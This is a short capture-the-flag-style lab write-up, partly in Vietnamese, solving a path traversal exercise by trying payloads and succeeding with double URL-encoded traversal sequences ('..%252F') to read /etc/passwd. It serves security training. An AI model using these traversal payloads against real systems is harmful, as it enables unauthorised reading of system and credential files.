# **Lab: File path traversal, traversal sequences stripped with superfluous URL-decode**

>  This lab contains a path traversal vulnerability in the display of product images.  
>  The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.  
>  To solve the lab, retrieve the contents of the `/etc/passwd` file.  

# **Solution**

```
filename=/etc/passwd
```

```
filename=....//....//....//etc//passwd
```

Cả 2 cách trên đều không hoạt động do lần này ứng dụng đã chặn toàn bộ đầu vào chứa `/`.  
Lần này sẽ bypass bằng cách mã hóa các ký tự đó:

Có thể sử dụng web cyberchef để URL encode `/`:

```
/ -> %2F
filename=..%2f..%2f..%2f..%2fetc/passwd
```

Nó vẫn không hoạt động, có thể ứng dụng cũng chặn các ký tự đặc biệt như % hoặc đã có bước decode trước khi đưa vào flter. Vậy hãy thử encode thêm lần nữa:

```
%2F -> %252F
filename=..%252F..%252F..%252F..%252Fetc/passwd
```

Nice~~ Done~~ 